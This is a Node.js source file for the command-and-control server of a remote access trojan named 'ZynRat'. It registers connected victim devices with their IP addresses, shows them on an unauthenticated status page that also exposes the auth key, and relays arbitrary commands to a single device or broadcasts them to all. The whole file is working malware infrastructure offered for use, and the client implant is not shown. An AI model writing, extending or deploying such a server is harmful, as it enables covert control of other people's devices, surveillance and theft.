const WebSocket = require('ws');
const express = require('express');
const http = require('http');

const PORT = process.env.PORT || 3000;
const AUTH_KEY = 'zyn_' + Math.random().toString(36).substr(2, 16);

const clients = new Map();
let nextId = 1;

const app = express();
app.use(express.json());

app.get('/', (req, res) => {
  const list = [];
  for (const [id, client] of clients.entries()) {
    list.push({
      id: id,
      device: client.device || 'unknown',
      ip: client.ip || 'unknown',
      online: client.ws.readyState === WebSocket.OPEN
    });
  }
  res.json({
    server: 'ZynRat',
    online: list.filter(c => c.online).length,
    total: list.length,
    authKey: AUTH_KEY,
    clients: list
  });
});

app.post('/cmd/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const client = clients.get(id);
  if (!client) return res.status(404).json({ error: 'not found' });
  try {
    client.ws.send(JSON.stringify({ type: 'cmd', cmd: req.body.cmd }));
    res.json({ ok: true, sent: req.body.cmd });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/broadcast', (req, res) => {
  let sent = 0;
  for (const [id, c] of clients.entries()) {
    if (c.ws.readyState === WebSocket.OPEN) {
      try {
        c.ws.send(JSON.stringify({ type: 'cmd', cmd: req.body.cmd }));
        sent++;
      } catch (e) {}
    }
  }
  res.json({ ok: true, sent: sent });
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  const id = nextId++;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const client = { ws, ip, device: null, id };
  clients.set(id, client);
  console.log(`[+] #${id} from ${ip}`);

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg.toString());
      if (data.type === 'hello') {
        client.device = data.device;
        ws.send(JSON.stringify({ type: 'welcome', id, authKey: AUTH_KEY }));
      }
    } catch (e) {}
  });
});

server.listen(PORT, () => console.log(`Server on ${PORT}`));
